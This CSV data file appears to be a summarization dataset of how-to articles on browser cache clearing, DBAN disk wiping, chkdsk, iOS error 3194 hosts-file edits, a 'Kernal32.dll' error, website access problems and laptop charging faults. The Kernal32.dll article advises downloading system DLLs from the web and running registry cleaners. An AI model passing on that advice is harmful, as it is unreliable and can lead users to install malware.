headline,title,text
"
Open Safari.

,
On the menu at the top, select ""Safari"".

,
Toggle ""Clear All Website History and Data"".",How to Clear Your Browser's Cache16,",,


2 Methods: There are two methods mentioned in this article. The one mentioned first doesn't work anymore.

"
"
Click on Settings from the home page.

,
Scroll down until you see ""Safari."",
Click ""Clear Cookies and Data.",How to Clear Your Browser's Cache17,", Click on it to bring up the option page.

,""A popup box will appear. Click ""Clear Cookies and Data"" again to confirm your choice.

"
"
Open the browser.

,
Tap the Menu Key.

,
Click on the ""More Options"" button.

,Click on ""Settings""

,
Tap ""Clear Cache.""",How to Clear Your Browser's Cache18,",,,, You'll then be presented with a verification menu. Tap ""Okay"" or ""Clear Cache"" again (depending on the version of your phone) to complete the process.

"
"
Back up any data on the drive you want to save.,
Download DBAN.,
Burn DBAN to a disc.,
Boot from the DBAN disc.,
Select your hard drive.,
Choose your wiping method.,
Start the format.",How to Format a Hard Disk5," When securely wiping your hard drive, there is absolutely no way that you can recover it. A properly wiped hard drive would take a government supercomputer days to potential recover a fragment of a file. Because of this, ensure that you have everything saved that you need.


See this guide for details on backing up your data.

, DBAN is a hard drive formatting program that is designed to securely wipe the data from the drive by overwriting it multiple times. This will prevent the data from being restored using a data recovery program.


DBAN does not work for solid state drives (SSD). You will need to use a different program, such as Blancco.

, DBAN is downloaded as an ISO file, which is a disc image. Burning the ISO to a disc will allow you to boot directly into the DBAN interface.


See this guide for details on burning ISOs to DVD.

, Insert the DBAN disc into your computer and reboot. Select the disc drive as your primary boot device.


Windows - You will need to set your optical drive as the boot drive from the BIOS menu. See this guide for details on setting your boot order.
OS X - Press and hold C while your computer is rebooting. After a little while DBAN will boot.

, Press ↵ Enter on the DBAN main screen, and then select your drive with the arrow keys. Be sure to pick the correct drive if you have multiple available.

, ""DoD"" will securely erase your data, and is a good enough wiping method for the majority of users. If you have extremely sensitive information, select the ""8-Pass PRNG Stream"". This will wipe your hard drive eight times with random numbers, completely eradicating your data.

, Once you've selected your wiping method, the formatting process will begin. Wiping with DBAN can take several hours to several days, depending on the wiping method and size of the hard drive."
"
Attempt to boot your computer in order to run the disk repair utility chkdsk.,
Place the disk on a different computer.,
Run 'chkdsk' until end.

,
If you have a graphical interface, go to ""My Computer"", select the appropriate disk, click with the right mouse button and select Properties.,
If you have just a text console, write ""chkdsk c:"".,
In order to fix problems found repeat the above step but use ""chkdsk c: /r"" in order for the utility to automatically recover lost data.",How to Fix Ntfs Error," This can be done by one of the following ways:
Safe mode:



 


Boot your computer in safe mode, continuously press F8 key while it's starting. A menu will appear where you can choose booting in ""safe mode"".


System installation CD-ROM or DVD:






Insert your system install medium into the computer. When it starts it should detect that an installation has already been made and let you start the recovery console (by pressing the 'R' key). You will have to follow the on-screen instructions until you see the repair console.

;
, Remove the hard disk drive from your computer and place it on another computer. You'll be able to access your disk from the other computer's host system.

,, Head for the ""Tools"" tab. Select ""Check this drive for errors"".

, ""c:"" should be replaced with the appropriate drive letter for the partition you are trying to check.

, this process can take some time depending on speed of computer and size of Hard drive

"
"
Quit iTunes.,
Open the hosts file on the computer.,
Find the bottom of the hosts file.,
Look for a .74.208.105.171 gs.apple.com entry.,
Save your changes.,
Open iTunes and attempt your restore or update again.,
Put your iOS device into Device Firmware Update (DFU) mode.,
Log into the iCloud website or open the ""Find My iPhone"" app on another device.,
Open the Find My iPhone service in iCloud.,
Select your iOS device from the top menu.,
Click the ""Erase"" button in the iOS device's card.,
Setup your iOS device and restore your backup.",How to Fix Error 3194 on iOS," Make sure iTunes is completely closed before proceeding so that the changes you make take effect.;
, Error 3194 most often appears when you are trying to update or restore your iOS device through iTunes, and iTunes cannot connect to the Apple verification servers. This is common if you have jailbroken your device in the past or are trying to downgrade iOS.


Windows - Navigate to C:\Windows\System32\drivers\etc and double-click the hosts file. Select ""Notepad"" from the list of available programs.
Mac - Open the Terminal from the Utilities folder, type sudo nano /etc/hosts, and press ⏎ Return. This will open the hosts file in a text editor.

, You'll be looking for an Apple address at the bottom. A standard hosts file will not have any lines without a # at the front.

, This redirects the signature verification process to the Cydia servers.It is the presence or lack of this redirection that is causing the error. What you do next depends on whether or not you can find this line:


If you have 74.208.105.171 gs.apple.com at the bottom of the file, add a # to the front.
If you don't have the line, add 74.208.105.171 gs.apple.com to the bottom of the hosts file.

, This should allow your iPhone to make the connection properly.Windows - Click the File menu and select ""Save.""
Mac - Press Ctrl+O to save and Ctrl+X to quit.

, In many cases, the changes you made to your hosts file should allow you to proceed.


Note: If you're trying to downgrade to a previous version, it may not be possible with the version of the firmware you have downloaded. Try a normal restore using the firmware downloaded directly through iTunes.

, This may be necessary if iTunes is still not able to connect. You will be prompted to restore your iPhone, which will erase all of the data on it:


Connect the iOS device to your computer and turn it completely off.
Press and hold the Power and Home buttons for 10 seconds.
After 10 seconds, release the Power button but continue holding the Home button. You'll see a message in iTunes prompting you to restore the iPhone.

, If you can't get the update process to work even after changing your hosts file, you can try remotely erasing your iOS device using iCloud. The device you're trying to erase will need to have internet access and ""Find My iPhone"" enabled. You'll be able to restore the device from any iCloud or iTunes backup after erasing it.


You can access your iCloud account from any computer by visiting icloud.com. Log in with the Apple ID associated with your iOS device.

, This will open a map with your registered iOS devices.

, Click the ""All Devices"" menu and select the iOS device you want to restore.

, After confirming, the iOS device will begin automatically resetting to factory settings. This may take a while to complete.

, Start the iOS device setup process as if it were a new phone. You'll be given the choice to choose a backup from iCloud or iTunes, or you can proceed with a fresh install.

"
"
Reinstall any recently uninstalled programs.,
Similarly, Kernal32.dll error can also appear after an installation of other programs.,
Copy or download the Kernal32.dll file and place it on your PC.,
Clean your registry for invalid and corrupt entries.We all know that the registry is the critical component of the Windows operating system as it stores all information about the Dll files, programs on the computer and system settings.,
Actually, registry issues are the main cause of Kernal32.dll errors.",How to Fix Kernal32.Dll Error Instantly," A Kernal32.dll file may go missing due to an incorrect uninstall processes. That is, when uninstalling a curtain program from the computer, you may incorrectly delete the Kernal32.dll which results in Kernal32.dll error every time when another application trying to use this removed dll file. If you find that the Kernal32.dll error message appears soon after you uninstall a program, install it again to restore the Dll file. Also, when you are trying to uninstall it from your computer, you have to remember to uninstall it with Add/Remove Programs utility or a professional uninstaller to ensure a safe uninstallation.;
, If this is the case, it is recommended that you should uninstall the recently installed programs to prevent the conflict.

, It is normal that the Kernal32.dll error is caused because of a deletion activity. If you cannot find the Kernal32.dll anywhere on your computer, there is no doubt that it must have been deleted when uninstalling programs or other unneeded files. Hence, you can directly cope it from other programs or download it from a safe web and then place it on your computer.

, However, as days by, it is unavoidable that you may encounter registry issue due to a huge amount of invalid, useless and unwanted entries.

, To fix Kernal32.dll errors caused by registry issues, it is highly recommended that you should scan your registry with an advanced registry cleaning software to get rid of the corrupt and unwanted entries. Also, a registry cleaner program helps you to effectively fix registry errors to prevent Kernal32.dll error or other Kernal32.dll-related errors.

"
"
Try loading the site on a different device or network if possible you can try your mobile network.,
Restart your computer.,
Try loading the site in a different browser.,
Temporarily disable your antivirus program.,
Reset your modem and router.,
Check your computer's date and time settings.,
Ensure that there are no parental controls enabled.,
Uninstall Norton or McAfee.,
Install a lightweight antivirus to replace your old one.,
Ensure you only have one antivirus program installed.,
Ensure that JavaScript is enabled.,
Remove extensions that you don't recognize.,
Check the browser's connection settings.,
Reset your browser.,
Download AdwCleaner.,
Run AdwCleaner after downloading it.,
Click the ""Scan"" button to begin scanning.,
Click the ""Clean"" button after the scan is complete.,
Download and install the free version of Malwarebytes Anti-Malware.,
Launch Anti-Malware and click ""Update Now."",
Click ""Scan Now"" to begin scanning your computer.,
Click ""Quarantine All"" after the scan is complete.,
Reboot your computer and test the website.,
Flush your DNS settings.,
Find a new DNS to connect to.,
Connect to a new DNS.",How to Fix if You Can't Access a Particular Website," Try loading the website on your phone or on another computer. If the website loads on the other device, the problem lies with your computer. If the website doesn't load on another device, the problem is either with the network or the website itself.


If you can, try to load the website on another device connected to your network, and a device that's not connected to your network. The easiest way to do this is to load the website on your phone while connected to the same network as your computer, and then disconnect from the wireless network and load the page using your cellular data. This can help you determine if the problem is with your network or with the website.
If the website won't load on any device regardless of what network it is connected to, the website itself is most likely down. You can double-check by looking up the site on a monitoring service like ""Is It Down Right Now?"" (iidrn.com).;
, Oftentimes, a simple reboot will fix the problem you're having. Reboot your computer and test the website again.

, There may be some settings configured incorrectly on your browser. Try a different web browser to see if you can load the website.


If you are using the default browser and don't have any others installed, you can quickly download and install another free browser like Firefox, Chrome, or Opera.

, Your antivirus software may be interfering with your ability to load certain websites. Try disabling the software and then loading the site again.


Right-click on the antivirus icon in your System Tray and select ""Disable"" or ""Turn Off."" You may be warned that this isn't safe.
Make sure to re-enable the antivirus after you're done testing.

, Traffic to or from a certain website may be getting tripped up by your modem or router. Resetting these devices may allow you to access the website again.


Unplug the power cables for the modem and the router (if you have a separate one), and wait about a minute.
Plug your modem back in and wait for it to completely light up.
Plug your router back in and wait for it to completely light up.
Try visiting the website again.

, If your date or time is set incorrectly, you may not be able to connect to secure (https://) websites. Check your computer or mobile device's clock to make sure that it is set to the correct time and date., If you have parental control software enabled, it may be blocking access to certain websites. If you have access to it, disable the parental control software and try accessing the website again. The process for this varies depending on the parental control program being used.

, These two antivirus programs have been known to cause the most problems with browsing websites. If you have one of these antivirus programs installed, consider removing it and replacing it with a lightweight, unintrusive antivirus.


See Uninstall Norton Internet Security for instructions on completely removing Norton software, which can be tricky.
See Uninstall McAfee Security Center for a guide on removing McAfee Security Center, another difficult program to get rid of.

, After removing the old antivirus, you'll want to make sure that you have a new program installed to protect your computer. See Install an Antivirus for general instructions on installing a new antivirus. The following free antivirus programs are highly-rated by security professionals and should not get in the way of loading websites:


Avast!
BitDefender
AntiVir
Microsoft Windows Defender

, Having multiple antivirus programs installed at the same time can cause problems. Conflicting protection could lead to some websites not loading. Keep the antivirus program that you like best and get rid of the rest.


See Uninstall a Program for general instructions on removing programs. You can also find uninstallation guides for most popular antivirus programs on wikiHow.

, If JavaScript has been disabled, you'll encounter difficulties loading a lot of popular sites. Check your browser settings to ensure that it is enabled:


Internet Explorer - Click the Tools menu or Gear button and select ""Internet options."" Click the ""Security"" tab and then click the ""Custom level"" button. Scroll down to the ""Scripting"" section and set ""Active scripting"" to ""Enable.""
Chrome - Click the Chrome Menu button and select ""Settings."" Click the ""Show advanced settings"" link at the bottom, then click the ""Content settings"" button in the ""Privacy"" section. Ensure that ""Allow all sites to run JavaScript content"" is selected.
Firefox - Enter ""about:config"" into the address bar and confirm that you want to proceed. Type ""javascript.enabled"" into the search field. Ensure that the ""Value"" for ""javascript.enabled"" is set to ""true.""
Safari - Click the Safari or Edit menu and select ""Preferences."" Click the ""Security"" tab and check the ""Enable JavaScript"" box.

, An extension may be causing problems with your browser. Disabling or removing extension you don't recognize or don't need may help. Your browser doesn't require extensions to run, so you can safely disable any extension you come across.


Internet Explorer - Click the Tools menu or Gear button and select ""Manage add-ons."" Select extensions from the list and click ""Disable"" to turn them off.
Chrome - Click the Chrome menu button and select ""More tools"" → ""Extensions."" Uncheck the ""enabled"" box for each extension you want turn off.
Firefox - Click the Firefox menu button and select ""Add-ons."" Click the ""Extensions"" option in the left menu. Click the ""Disable"" button next to each extension.
Safari - Click the Safari or Edit menu and select ""Preferences."" Click the ""Extensions"" tab and then uncheck the ""Enable"" box for each extension you want to turn off.

, If your browser was set to connect through a proxy, you may be experiencing connection issues. Check your connection settings and disable the proxy server to see if the issue is resolved.Internet Explorer - Click the Tools menu or Gear button and select ""Internet options."" Click the ""Connections"" tab and then click the ""LAN settings"" button. Check the ""Automatically detect settings"" box and uncheck ""Use a proxy server for your LAN.""
Chrome - Click the Chrome Menu button and select ""Settings."" Click the ""Show advanced settings"" link at the bottom of the list. Scroll down and click the ""Change proxy settings"" button. Click the ""LAN settings"" button. Check the ""Automatically detect settings"" box and uncheck ""Use a proxy server for your LAN.""
Firefox - Click the Firefox menu button and select ""Options."" Select the ""Advanced"" menu option and then click the ""Network"" tab. Click the ""Settings"" button and then select ""No proxy"" or ""Use system proxy settings.""
Safari - Click the Safari or Edit menu and select ""Preferences."" Click the ""Advanced"" tab and then click the ""Change Settings"" button. Uncheck any active proxy settings.

, If you still can't connect, you can try resetting your browser's settings. This will remove all of your data from the browser and revert it to its default settings.Internet Explorer - Click the Tools menu or Gear button and select ""Internet options."" Click the ""Advanced"" tab and then click ""Reset."" Check the ""Delete personal settings"" box and click ""Reset"" again.
Chrome - Click the Chrome Menu button and select ""Settings."" Click the ""Show advanced settings"" link. Scroll to the bottom of the page and click ""Reset settings."" Click ""Reset"" to confirm.
Firefox - Click the Firefox menu button and select ""?"" at the bottom of the menu. Click the ""Troubleshooting Information"" option. Click ""Refresh Firefox"" and then ""Refresh Firefox"" again to confirm.
Safari - Force-quit Safari by pressing ⌘ Command+⌥ Option+Esc and selecting Safari from the list. Once Safari quits, hold ⇧ Shift and launch Safari again from the Dock or Applications folder. Turn Wi-Fi off and try to visit a website. Once the site loads and says that you have no connection, turn Wi-Fi back on., This is a free adware scanner that will find most common adware and malware infections. You can download it for free from toolslib.net/downloads/viewdownload/1-adwcleaner/.

, After confirming that you want to run the program, it will begin downloading additional files necessary for scanning. This should only take a few moments.

, AdwCleaner will begin scanning your computer, which will usually take about 15-20 minutes.

, AdwCleaner will remove all of the malicious files found during the scan.

, The free version contains a fully functional scanner and cleaner for home use. You can download it from malwarebytes.org/.


Run the installer after downloading Anti-Malware to install it. Select the free license if prompted.
There is a Mac version as well, which is the current version of AdwareMedic, one of the more powerful anti-malware programs for Mac.

, This will download any available updates, which can help Anti-Malware find more bad files.

, This scan will usually take a little longer than the AdwCleaner scan.

, This will remove any of the files found during the scan.

, If adware was preventing you from visiting certain sites, you should be able to visit them now.

, The DNS (Domain Name System) is the service that translates web domain names into IP addresses so that you can connect to websites. If your local DNS files have been corrupted, you may not be able to load certain websites. Flushing your DNS will clear out your local DNS information and load a fresh copy.Windows - Press ⊞ Win+R and type cmd to open the Command Prompt. Type ipconfig /flushdns and press ↵ Enter. You will receive a message that the DNS cache has been flushed, and you can close the Command Prompt.
Mac - Open the Terminal from the Utilities folder. Type dscacheutil -flushcache and press ⏎ Return. Then type sudo killall -HUP mDNSResponder and press ⏎ Return to restart the DNS service. You'll be prompted for your admin password.

, Typically you'll connect to the DNS provided by your internet service provider, but there are many more options. Some may even result in faster browsing. Perform a web search for ""free DNS list"" to find up-to-date listings of free DNS providers. You can typically find speed comparisons as well.


There will typically be two addresses: the Primary and the Secondary. You'll need both in a moment.
Note that not all public DNSs allow access to the same content. It's recommended that you use Google or OpenDNS for the most accessibility.

, Once you've found the server you want to connect to, you'll need to point your computer to it.


Windows - Press ⊞ Win+R and type ncpa.cpl. This will open the Network Connections window. Right-click on your network adapter and select ""Properties."" Highlight ""Internet Protocol Version 4"" in the list and click the ""Properties"" button. Select ""Use the following DNS server addresses"" and enter in the addresses you want to use.
Mac - Open the Apple menu and select ""System Preferences."" Click the ""Network"" option and then select your active network. Click the ""Advanced"" button and then the ""DNS"" tab. Enter the servers that you want to connect to.

"
"
Make sure all hardware such as cables and wiring are firmly in place, and any antenna's on ay wireless routers are raised to approximately the 90 degree defaults that your ISP installer should have mentioned to you about using.,
Refresh your browser.,
Close and open all your old browser windows.,
Clear your storage places including the browser's cache, cookies, temporary files, history, and the like.,
Turn off any and all add-on extensions/toolbars that didn't initially come with your browser.,
Test out other browsers to see if it's just affecting that particular browser or all browsers on your PC.,
Cycle your Internet connection equipment again.,
Contact the webmaster of the website directly, either through their web-form, email or telephone lines.,
Contact your Internet Service Provider, if all else fails.,
Take a break.",How to Fix a 502 Error on a PC," (Also make sure the antenna card is working, and hasn't been disabled by your computer not due to your disabling but by your computer's own disabling).;
, Either click the refresh button (which could be a swirly-arrowhead or some other button that says ""load again"" or ""refresh"") or for quicker access, press the F5 on your keyboard. 502 error codes tend to be only temporary and this step may be the farthest you'll need to go to get your computer back to it's working self again.

, Browsers, like people, need to be fresh and new to feel rejuvenated and be able to work again.

, Most browsers have ways to do this which are effective. Flushing your DNS Cache may also help.

, See if this improves things. It should. When you do bring them back, make sure to bring back items one at a time, closing and re-opening the web browser. When you find one that causes your browser to crash to another 502 error, disable and enable others, it may just be that certain add-on may have a problem or is outdated.

, Sometimes even when all add-on extensions/toolbars are disabled, the browser can be at-fault (either because it's not up to date or for some other reason). People always say Internet Explorer is problematic, while others don't feel the same way, temporarily change it until you can have it serviced.

, This can help create a new default ""gateway"" number/mask that can help the computer become stable again, and perhaps find a new route to the site, around the problematic connection on the other line.

, They may have heard about the problem with errors before your connection, and may be willing to give you a fix (such as a temporary connection to an alternate site hosting the same information they use as a backup in these cases).

, It may be a problem in the Internet connection, where you can't see it at first, that only your ISP will have a way to decipher or determine the problem.

, Come back later to the problem. Sometimes a bit of a ""break"" in a computer, may make it feel refreshed. Shut it down completely, using the proper Windows ""Shut Down"" button. Don't just hibernate or stand-by the Windows PC.

"
"
Unplug for a few minutes, then try a different outlet.,
Examine the cord.,
Inspect the connection.,
Restart the computer, removing the battery in between.,
Let the computer cool down.,
Start up your laptop without a battery.,
Replace the charger.,
Check your power settings.,
Open the Device Manager.,
Look at the Batteries settings.,
Update driver software.,
Restart the computer.,
Uninstall and reinstall the driver.,
Check your energy settings (Apple laptops).,
Reset the System Management Controller.",How to Fix a Laptop That Is Not Charging," Unplug the laptop, wait a few minutes, then plug it into an outlet in a different room. Some users report that a laptop power adapter can temporarily stop working to protect itself from a perceived issue with the power supply.If your battery is removable, take it out while the power source is disconnected. Hold down the laptop's power button for two minutes, put the battery back in, and plug it in to a new outlet.;
, Examine the entire length of the power cord for tears, dents, and worn-down insulation. If you notice any, or if the power brick is warped or smells like burnt plastic, the cord is probably faulty.You'll need to purchase a new cord for your laptop.


Check your warranty before replacing any parts. The cost may be covered under some circumstances.

, If the cord's attachment to your laptop wobbles or feels loose, there could be a problem with the connection. Unplug the cord, remove debris with a wooden toothpick, and remove heavy dust build-up with compressed air.


Bent pins and other damage issues are model-specific. Take the laptop or cord to a computer repair shop. You can look up your model online for repair instructions, but this can be difficult without proper tools, and may void the warranty.

, Shut down the computer, unplug it, then remove the battery from your laptop. The battery can usually be accessed from the underside of the laptop, and may have a lock you can turn with a coin, or release by lifting a lever. Leave the battery out for ten seconds, slot it back in, then start up your computer. Plug the laptop in again after start-up and wait ten seconds to see if it works.


Not all laptops have easily accessible batteries. If there is no obvious battery compartment, just restart your computer without removing the battery.

, If your laptop battery feels very hot to the touch, excess heat could be interfering with the charging process.Shut down the computer and let it sit for several minutes to cool down. If you haven't cleaned your laptop vents recently, blow a can of compressed air into the fan vents at an angle, in short bursts, to remove some dust.


Do not blow directly into the fan vents, only at an angle, or you could damage the fan.If you are comfortable disassembling your laptop, you can use the compressed air to blow away internal dust directly. Look up a guide to disassembly for your model before you begin, and work on a large, clear surface. This will likely void your warranty.

, Shut down the computer, remove the battery, and plug the computer in. If the computer won't turn on, you probably need a new cord. If you can start it up again in this situation, the charging issue is probably due to the battery itself, or your computer's interaction with the battery. The methods below may fix the problem, or your battery may be dead and require replacement.


If your laptop battery is not removable, skip this step and try the methods below before taking your laptop to a computer repair store.

, Sometimes the adapter (the box in the cord) is faulty, or despite your best efforts you can't repair a loose plug. Try borrowing a friend's charger, or asking an computer store employee to test your charger. If your charger is faulty, buy a new part from a computer or electronics store., Go to Start → Control Panel → Power Options. There may be a ""low battery level"" setting at too high a level, which can cause your computer to shut down instead of charge.The simplest way to deal with these settings is to restore them to the default. If this does not fix the problem, continue on below

, First, open ""Device Manager"". This can be found most easily with a Windows computer by using the search function, or by navigating to Start → Control Panel → System and Security → Device Manager., When the list has loaded, expand the ""Batteries Tab"".

, Right click ""Microsoft ACPI-Compliant Control Method Battery,"" then select ""Update Driver Software.""Follow the instructions that appear.

, Shut down the computer and start it up again, so the driver will take effect. If the laptop still won't charge, repeat the ""Update driver"" step on every entry in the Battery section, then restart your computer a second time.

, If you still cannot charge your laptop, try right-clicking ""Microsoft ACPI-Compliant Control Method Battery"" and selecting ""Uninstall."" When the process is finished, click the button on the toolbar that says 'Scan for hardware changes"" Alternately, you can open the ""Action"" tab and press Scan for hardware changes. Restart your computer once the driver is reinstalled.


This step requires an internet connection on your laptop.

, Open Systems Preferences from the Dock or your Applications folder. Click on Energy Saver and check both the ""Battery"" and ""Power Adapter"" setting tabs. In rare cases, a sleep setting set too low can look like a battery charging issue.In most cases, you'll need to try the additional steps below.

, Use one of these methods to reset the SMC, which controls battery management, battery status light:Laptops with a non-removable battery: Shut down the computer. Plug it into a power source. On the built-in keyboard, press the left-side shift control option keys and the laptop power button at the same time. Release the keys at the same time, then turn on your computer.

Laptops with a removable battery: Shut down the computer and disconnect the power cord. Remove the battery. Press and hold the power button for five seconds. Reattach the battery and power cord attached to an outlet, then start up the computer.

"
